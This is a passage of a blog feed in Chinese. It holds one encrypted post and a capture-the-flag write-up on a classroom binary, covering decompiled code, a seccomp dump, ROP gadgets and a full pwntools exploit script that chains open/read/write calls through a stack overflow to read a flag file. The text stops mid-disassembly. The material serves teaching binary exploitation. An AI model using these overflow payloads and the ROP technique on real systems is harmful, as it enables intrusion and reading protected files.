            "content_html": "<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"08bc550c0edbcb3fe8369a6b8d9fc34d984017a327627b3d21107df6d5def395\">297f05f60dc60df7ad3147a64b55ba41ef632e7886bb70583f539f79dc665bd91c6dfb281a95c83b3f586677bfbacee5619cc440a2a39527bc1daaadd221f0a47bac954bf7833a08ccf0244f0c6223062aa0c91627c11d4d7dda024c87510b8fa2a2d65e4ed0e87cccb67cfa9efcd2162588bd631c2cfff823b9dc7239882caba90b3045af0e2877fdbe08ee4114bcf8fc85883a75bd443e78ab3d7eba34a297712270a123b0c88d1a8f2ba71b14184d4ae56dfbadc0ab2ee842dd24ffbdb371d8e96303e33be07ff7c5bff09b924db81840ceca18a668c6466dbcbce33837da8dd9395ec835e2ec5b3bac35f4fedfa8927c9ab34210b69142e5fd6d9b2bee0b4a376bdc7c6e59f8b0052cc7cdb57ab23a8e6329cc868570031411e6492509030f2574b196ddfd93e61b3b887789613a22b4d9c1d8dc37a3c9e8bd7b696f72e11e9a71328eb8304641842ad2d8ea18f87a0413317acb21e00237a48a7db823aa188a8ce2d693b055a0877d5312d3e2e08353b8e84fdf82ab5ff97bff097c3eef561b882de9143ab02a870ac4181db8a4ae522b20066fa69e0efb19d46164b5dbec3558aea1e2dcc3e3102f9df6b4636ef48505a11304363ae0f771ca0a1056625cf7aa7e0acbce7b3d09bf4cd864358fc668240774b1126d92a87cda62e098f9e61d0e1f89e3346231f05a076a65b3805a39d278e2516ade05a5485bf423c3ca1160f8cfc59c41ca7f130bf675a3bbaa15fb87a8277e61bf53bff5c2d1d7c0d1455c4bcb2264f40b38e40fcfca9a04c71380d6c10c614503f2e9ed9574716d3f475408a21460063e650e8fa39276e341c7cfd798202fd76bd79998e1436817ba77f4d63a3c4269c0487ad8ec8bf57bf509c8e0efa8184a3de1af25c4bbdfc6b6f9e9dfe10767e0820cd6de6f361113e6ed50ecdbc2f0943fb2a50584440b56e31364aa430d9015b1e826c0f5ee4c86da9536642fc2d9817f7c71c40b7b8a429eaec480d9d1d5c6c5bbfec678e8f0a4579638462189c75a92ee6347960aad8ef7663dce55bd70fadee82c26fc861ac79731328a16b2f0dc6990cedd25673b794dd443421b87b5079245f08057321ca94d03943efc8a4d9718e602a7ac8a998c3ee5f520a45608aac42b89f1673b762c8ff043b1d9109cf27dd5b48ed1ccaab806ee6c947c9e07778bc9c93ba6e2a00bd4179d8baa6b0b7aaae16aff24e93208cbd2daf875ba9faf4202afe16992e319d61b4217c47cbc1d06cf48893f6fba2fe32f1bad4d20de0387a44aa27913f95209011fa381f39f4abb3f8528dc556939c8fa621f2f40a2fcc28ffe7bbe1aad194680dcd08005928949166f77bfe4383bf0a3de0860eac7da6be4fdc04e2ee6375b7348d2f4a31d56341165746c9e7771e3dc1190811c2d1f48929fa7849de57491f4df273595dcda76ca1fe2e179fe1ad405bae35c36b6fd5882a61d43ea80c8f3fc52fc19d4d0e8e2ba4423286845cb584bb73dea59d938a8389e5268f65814103345c58105d0249dc534fcde471ce4ab1d0daf2e948bc4752b4f28ffae12deee29037a8300263f0fda47c2164aeb8a0311e2938f9cb98db27a0f88d75fb9972d4f85edd70b1bf5db7feb8dd4c1aeb130cf9f1028d0a043c1550734f89ab9ddd007fc99047901218c3930e53ef06c76c5199a6b62a25b0d329bde8c6f7d43319c7f3d59454a104b5e456cb60bd209348f1699a2c6e8cbd783884ea24cc7649476cb7386fa174779a94644dc6c0407ec784a0351fc0139509a2db7843d129533d6a52c458f3d903bd525cdfbcc45c92195407fd35ba6493f8ceb33110ad3963ea25402301dd07c1d5e35419c3e1f7d9bc7c50c0f1505fe1436a379a312616495642905d00b71718b9cdaa2a364d95f58a642054965a4a69a3282d131291f97dcf19139d99cb5e776c10d1c81af98491631e89909483908605fdd036dd069135ea17b37d125dc4028ba2c94b90511be379159ebf9eef389b4700586e7f96869d365552995894eb55e506e0b846d4fc2b4e1873971a7e8aa8c5ff0a0437a6415f177259c855c711e1cd5d0a71da4b26d8f0016b5b41f41c2f9ef7a51b1860f265607ecd9d7b37c74e25599ce3606e952db86</script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-default\">\n      <input class=\"hbe hbe-input-field hbe-input-field-default\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-default\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-default\">Hey, password is required here.</span>\n      </label>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-22-ucas%E8%AF%BE%E5%A0%82%E7%BB%83%E4%B9%A0rop%E4%B9%8Borw/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-22-ucas%E8%AF%BE%E5%A0%82%E7%BB%83%E4%B9%A0rop%E4%B9%8Borw/",
            "title": "pwn入门-22-ucas课堂练习rop之orw",
            "date_published": "2023-03-17T05:59:53.000Z",
            "content_html": "<p>题目链接: <a href=\"https://tangzichengcc.github.io/2023/03/17/pwn%E5%85%A5%E9%97%A8-22-ucas%E8%AF%BE%E5%A0%82%E7%BB%83%E4%B9%A0rop%E4%B9%8Borw/rop\">https://tangzichengcc.github.io/2023/03/17/pwn入门-22-ucas课堂练习rop之orw/rop</a></p>\n<p>​\t\t课上的一个小练习,理论上应该不难的..但是卡了很久…因为基础不牢+菜</p>\n<h1 id=\"反汇编代码查看\"><a href=\"#反汇编代码查看\" class=\"headerlink\" title=\"反汇编代码查看\"></a>反汇编代码查看</h1><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl __noreturn <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = <span class=\"number\">-1</span>;</span><br><span class=\"line\">  install_seccomp(argc, argv, envp);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stderr</span>, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Welcome to the Santa&#x27;s gift!&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;your choice:&quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v3);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v3 == <span class=\"number\">4919</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    vuln();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v3 != <span class=\"number\">9011</span> )</span><br><span class=\"line\">      _exit(<span class=\"number\">1</span>);</span><br><span class=\"line\">    some_gifts();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">ssize_t</span> <span class=\"title function_\">vuln</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">256</span>]; <span class=\"comment\">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x150</span>uLL);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">ssize_t</span> <span class=\"title function_\">some_gifts</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s[<span class=\"number\">16</span>]; <span class=\"comment\">// [rsp+0h] [rbp-1010h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">int</span> fd; <span class=\"comment\">// [rsp+100Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  fd = sys_open(<span class=\"string\">&quot;./gifts.txt&quot;</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(s, <span class=\"number\">0</span>, <span class=\"number\">0x1000</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( read(fd, s, <span class=\"number\">0x1000</span>uLL) &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;read error&quot;</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> write(<span class=\"number\">1</span>, s, <span class=\"number\">0x1000</span>uLL);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"检查安全措施\"><a href=\"#检查安全措施\" class=\"headerlink\" title=\"检查安全措施\"></a>检查安全措施</h2><p>​\t\tinstall_seccomp、</p>\n<p>​\t\t看到这个函数就知道有seccomp保护措施,限制了一些系统调用的使用,于是使用工具进行检查,</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/tmp<span class=\"meta\"># seccomp-tools dump ./rop</span></span><br><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">=================================</span><br><span class=\"line\"> <span class=\"number\">0000</span>: <span class=\"number\">0x20</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000004</span>  A = arch</span><br><span class=\"line\"> <span class=\"number\">0001</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x00</span> <span class=\"number\">0x0c</span> <span class=\"number\">0xc000003e</span>  <span class=\"keyword\">if</span> (A != ARCH_X86_64) <span class=\"keyword\">goto</span> <span class=\"number\">0014</span></span><br><span class=\"line\"> <span class=\"number\">0002</span>: <span class=\"number\">0x20</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000000</span>  A = sys_number</span><br><span class=\"line\"> <span class=\"number\">0003</span>: <span class=\"number\">0x35</span> <span class=\"number\">0x0a</span> <span class=\"number\">0x00</span> <span class=\"number\">0x40000000</span>  <span class=\"keyword\">if</span> (A &gt;= <span class=\"number\">0x40000000</span>) <span class=\"keyword\">goto</span> <span class=\"number\">0014</span></span><br><span class=\"line\"> <span class=\"number\">0004</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x08</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000002</span>  <span class=\"keyword\">if</span> (A == open) <span class=\"keyword\">goto</span> <span class=\"number\">0013</span></span><br><span class=\"line\"> <span class=\"number\">0005</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x07</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000101</span>  <span class=\"keyword\">if</span> (A == openat) <span class=\"keyword\">goto</span> <span class=\"number\">0013</span></span><br><span class=\"line\"> <span class=\"number\">0006</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x06</span> <span class=\"number\">0x00</span> <span class=\"number\">0x000001b5</span>  <span class=\"keyword\">if</span> (A == <span class=\"number\">0x1b5</span>) <span class=\"keyword\">goto</span> <span class=\"number\">0013</span></span><br><span class=\"line\"> <span class=\"number\">0007</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x05</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000000</span>  <span class=\"keyword\">if</span> (A == read) <span class=\"keyword\">goto</span> <span class=\"number\">0013</span></span><br><span class=\"line\"> <span class=\"number\">0008</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x04</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000001</span>  <span class=\"keyword\">if</span> (A == write) <span class=\"keyword\">goto</span> <span class=\"number\">0013</span></span><br><span class=\"line\"> <span class=\"number\">0009</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x03</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000003</span>  <span class=\"keyword\">if</span> (A == close) <span class=\"keyword\">goto</span> <span class=\"number\">0013</span></span><br><span class=\"line\"> <span class=\"number\">0010</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x02</span> <span class=\"number\">0x00</span> <span class=\"number\">0x0000003c</span>  <span class=\"keyword\">if</span> (A == <span class=\"built_in\">exit</span>) <span class=\"keyword\">goto</span> <span class=\"number\">0013</span></span><br><span class=\"line\"> <span class=\"number\">0011</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x01</span> <span class=\"number\">0x00</span> <span class=\"number\">0x000000e7</span>  <span class=\"keyword\">if</span> (A == exit_group) <span class=\"keyword\">goto</span> <span class=\"number\">0013</span></span><br><span class=\"line\"> <span class=\"number\">0012</span>: <span class=\"number\">0x06</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00050005</span>  <span class=\"keyword\">return</span> ERRNO(<span class=\"number\">5</span>)</span><br><span class=\"line\"> <span class=\"number\">0013</span>: <span class=\"number\">0x06</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x7fff0000</span>  <span class=\"keyword\">return</span> ALLOW</span><br><span class=\"line\"> <span class=\"number\">0014</span>: <span class=\"number\">0x06</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000000</span>  <span class=\"keyword\">return</span> KILL</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t能够看到只允许用open read write这几个,一般来说pwn题是要拿到权限的,但是根本目的是拿到flag,所以即便拿不到shell,也可以利用这几个函数调用来读取和打印flag</p>\n<h1 id=\"解题步骤\"><a href=\"#解题步骤\" class=\"headerlink\" title=\"解题步骤\"></a>解题步骤</h1><h2 id=\"寻找gadget\"><a href=\"#寻找gadget\" class=\"headerlink\" title=\"寻找gadget\"></a>寻找gadget</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/tmp# ROPgadget --binary rop  --only <span class=\"string\">&#x27;pop|ret&#x27;</span>  </span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\"><span class=\"number\">0x00000000004014fc</span> : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"><span class=\"number\">0x00000000004014fe</span> : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"><span class=\"number\">0x0000000000401500</span> : pop r14 ; pop r15 ; ret</span><br><span class=\"line\"><span class=\"number\">0x0000000000401502</span> : pop r15 ; ret</span><br><span class=\"line\"><span class=\"number\">0x00000000004014fb</span> : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"><span class=\"number\">0x00000000004014ff</span> : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"><span class=\"number\">0x000000000040121d</span> : pop rbp ; ret</span><br><span class=\"line\"><span class=\"number\">0x0000000000401503</span> : pop rdi ; ret</span><br><span class=\"line\"><span class=\"number\">0x0000000000401501</span> : pop rsi ; pop r15 ; ret</span><br><span class=\"line\"><span class=\"number\">0x00000000004014fd</span> : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\"><span class=\"number\">0x000000000040101a</span> : ret</span><br><span class=\"line\"><span class=\"number\">0x0000000000401297</span> : ret <span class=\"number\">0x2be</span></span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: <span class=\"number\">12</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t根据调用约定,rdi rsi rdx是函数的前三个参数,但是没有找到pop rdx的gadget. ret2csu方法里是可以间接修改rdx的,<font color=\"red\">不过事实上,这道题不需要管第三个参数,具体原因还未知.</font></p>\n<h2 id=\"布局函数\"><a href=\"#布局函数\" class=\"headerlink\" title=\"布局函数\"></a>布局函数</h2><p>​\t\t这里有一个很重要的问题,就是二进制文件中不存在flag这四个字符,因为后面读取flag,需要用到这个字符串,所以需要先获取这四个字符. 获取之后利用传统的orw来进行打开,读取和写出flag.</p>\n<p>open(’文件名‘,0,0)  </p>\n<p>read(文件描述符,‘文件名’,读取大小)   read比较特殊, 第一个文件描述符 0标准输入(从用户输入获取值) 1 标准输出,2标准错误 345..就是文件描述符了,当第一个参数是0的时候,第二个参数就不是文件名了,而是要写入的内存地址</p>\n<p>write(1，‘文件名’，写大小)</p>\n<p>​\t\t所以分了四个步骤,如下</p>\n<ul>\n<li><p>read(0,写入的内存地址,0x30)\t</p>\n</li>\n<li><p>open(‘flag’,0,0)</p>\n</li>\n<li><p>read(3,‘flag’,0x30) 从打开的文件中读取</p>\n</li>\n<li><p>write(1,‘flag’,0x30) 标准输出</p>\n</li>\n</ul>\n<h2 id=\"编写payload\"><a href=\"#编写payload\" class=\"headerlink\" title=\"编写payload\"></a>编写payload</h2><p>​\t\t256溢出+8字节rbp,然后就是返回地址了,构造rop链,下面四行分别对应着上面的四步</p>\n<p>​\t\tpoprsi的话,没有单独的 ,只有 0x0000000000401501 : pop rsi ; pop r15 ; ret, 所以在它后面再加一个垃圾数据.上面说过,没有pop rdx,所以我们只需要控制前两个参数即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">264</span> + p64(poprdi) + p64(<span class=\"string\">&quot;0&quot;</span>) + p64(poprsi)+ p64(bssaddr) +p64(<span class=\"number\">0</span>)+ p64(readaddr) </span><br><span class=\"line\">payload += p64(poprdi) +  p64(bssaddr) + p64(poprsi) + p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(openaddr)</span><br><span class=\"line\">payload += p64(poprdi) + p64(<span class=\"number\">3</span>) + p64(poprsi) + p64(bssaddr) +p64(<span class=\"number\">0</span>)+ p64(readaddr)</span><br><span class=\"line\">payload += p64(poprdi) + p64(<span class=\"number\">1</span>) + p64(poprsi) + p64(bssaddr) +p64(<span class=\"number\">0</span>) +p64(writeaddr)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t但是这里还有问题,就是payload的长度太长,溢出只有0x150 - 256 - 8  &#x3D;72字节,是不够用的,所以这里需要再进行调整,有两个办法,一个是可以多次溢出,四步可以分四步来进行,每完成一步,再跳回到vul函数开头,重新溢出执行下一步,第二个办法是进行栈迁移,把栈移到更大的空间去</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">264</span> + p64(poprdi) + p64(<span class=\"number\">0</span>) + p64(poprsi)+ p64(bssaddr) +p64(<span class=\"number\">0</span>)+ p64(readaddr)+p64(vuladdr)</span><br><span class=\"line\">payload1 = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">264</span>+p64(poprdi) +  p64(bssaddr) + p64(poprsi) + p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(openaddr)+p64(vuladdr)</span><br><span class=\"line\">payload2 = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">264</span>+p64(poprdi) + p64(<span class=\"number\">3</span>) + p64(poprsi) + p64(bssaddr) +p64(<span class=\"number\">0</span>)+ p64(readaddr)+p64(vuladdr)</span><br><span class=\"line\">payload3 = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">264</span>+p64(poprdi) + p64(<span class=\"number\">1</span>) + p64(poprsi) + p64(bssaddr) +p64(<span class=\"number\">0</span>) +p64(writeaddr)+p64(vuladdr)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t分四次发送即可,每次在最后跳回vul函数开头</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">sh = remote(<span class=\"string\">&quot;xxx&quot;</span>,xxx)</span><br><span class=\"line\"><span class=\"comment\">#sh = process(&quot;./rop&quot;)</span></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh,&quot;b *0x000004013AE&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">poprdi = <span class=\"number\">0x0000000000401503</span></span><br><span class=\"line\">poprsi = <span class=\"number\">0x0000000000401501</span></span><br><span class=\"line\">popr13 = <span class=\"number\">0x00000000004014fe</span></span><br><span class=\"line\">scanfaddr = <span class=\"number\">0x0000000000401451</span></span><br><span class=\"line\">bssaddr = <span class=\"number\">0x0000404100</span> + <span class=\"number\">0x100</span></span><br><span class=\"line\">readaddr = <span class=\"number\">0x000000401100</span></span><br><span class=\"line\">openaddr = <span class=\"number\">0x00000004012C9</span></span><br><span class=\"line\">writeaddr = <span class=\"number\">0x000000004010E0</span></span><br><span class=\"line\">start = <span class=\"number\">0x000401432</span></span><br><span class=\"line\">vuladdr = <span class=\"number\">0x0000000401384</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">264</span> + p64(poprdi) + p64(<span class=\"number\">0</span>) + p64(poprsi)+ p64(bssaddr) +p64(<span class=\"number\">0</span>)+ p64(readaddr)+p64(vuladdr)</span><br><span class=\"line\">payload1 = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">264</span>+p64(poprdi) +  p64(bssaddr) + p64(poprsi) + p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(openaddr)+p64(vuladdr)</span><br><span class=\"line\">payload2 = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">264</span>+p64(poprdi) + p64(<span class=\"number\">3</span>) + p64(poprsi) + p64(bssaddr) +p64(<span class=\"number\">0</span>)+ p64(readaddr)+p64(vuladdr)</span><br><span class=\"line\">payload3 = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">264</span>+p64(poprdi) + p64(<span class=\"number\">1</span>) + p64(poprsi) + p64(bssaddr) +p64(<span class=\"number\">0</span>) +p64(writeaddr)+p64(vuladdr)</span><br><span class=\"line\"><span class=\"comment\">#input()</span></span><br><span class=\"line\">sh.sendlineafter(<span class=\"string\">&quot;choice:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">4919</span>))</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.send(<span class=\"string\">&quot;flag&quot;</span>) <span class=\"comment\">#  不能用sendline 会有\\n</span></span><br><span class=\"line\">sh.sendline(payload1)</span><br><span class=\"line\">sh.sendline(payload2)</span><br><span class=\"line\">sh.sendline(payload3)</span><br><span class=\"line\">sh.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"细节注意\"><a href=\"#细节注意\" class=\"headerlink\" title=\"细节注意\"></a>细节注意</h1><h2 id=\"open-write-read函数选择\"><a href=\"#open-write-read函数选择\" class=\"headerlink\" title=\"open write read函数选择\"></a>open write read函数选择</h2><p>​\t\t一开始选的是 .text:0000000000401313 E8 B1 FF FF FF call sys_open ,这肯定是不对的,因为这里的话,控制流到了这里,执行完call没有ret会继续往下执行,就乱套了,</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:000000000040130C                 lea     rdi, aGiftsTxt  ; &quot;./gifts.txt&quot;</span><br><span class=\"line\">.text:0000000000401313                 call    sys_open</span><br><span class=\"line\">.text:0000000000401318                 mov     [rbp+fd], eax</span><br><span class=\"line\">.text:000000000040131B                 lea     rax, [rbp+s]</span><br><span class=\"line\">.text:0000000000401322                 mov     edx, 1000h      ; n</span><br><span class=\"line\">.text:0000000000401327                 mov     esi, 0          ; c</span><br><span class=\"line\">.text:000000000040132C                 mov     rdi, rax        ; s</span><br><span class=\"line\">.text:000000000040132F                 call    _memset</span><br><span class=\"line\">.text:0000000000401334                 lea     rcx, [rbp+s]</span><br><span class=\"line\">.text:000000000040133B                 mov     eax, [rbp+fd]</span><br><span class=\"line\">.text:000000000040133E                 mov     edx, 1000h      ; nbytes</span><br><span 